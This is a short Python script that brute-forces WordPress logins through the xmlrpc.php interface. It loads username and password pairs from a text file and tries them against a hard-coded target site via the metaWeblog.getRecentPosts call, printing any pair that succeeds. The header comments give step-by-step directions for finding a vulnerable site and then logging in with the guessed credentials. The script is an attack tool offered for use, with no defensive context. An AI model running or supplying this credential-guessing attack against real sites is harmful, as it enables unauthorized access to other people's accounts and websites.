#BruteForce attack for php-wordpress pages with remote acces feature xmlrpc
#First step: verify the xmlrpc service in the target page, typing page.com/xmlrpc.php
#Second Step: the name of the page is in page.com/wp-login.php: <- back to "name of the page"
#Three Step: if you get a succesfull user and password, get in to page.com/wp-login.php and put the user and password
import xmlrpc.client

passwords = []#lists where we will save the passwords and users that is in a text file
users = []
chars = "\n"#characteres that we dont want to save in the lists
page = xmlrpc.client.ServerProxy("https://uservzk80.com/xmlrpc.php") #target page

def getUsersnPasswords():
    txtFile = open("accounts.txt", "r")
    txtFile = txtFile.readlines()

    for line in txtFile:
        for char in chars:
            line = line.replace(char,"")#remove characters
            line = line.split(",")#separate
            users.append(line[0])#add to list
            passwords.append(line[1])

def attackBF():
    getUsersnPasswords()

    for passw in passwords:
        for user in users:
            try:
                log = page.metaWeblog.getRecentPosts("Uservzk80", user, passw)#put the name of the page, user and password
                if len(log) > 0:#if there is in the var 
                    print("Login succesfull with user: {0} pass: {1}".format(user, passw))#print the succesfull user and password
            except Exception as e:
                print("Error user: {0} pass: {1}".format(user, passw))

attackBF()

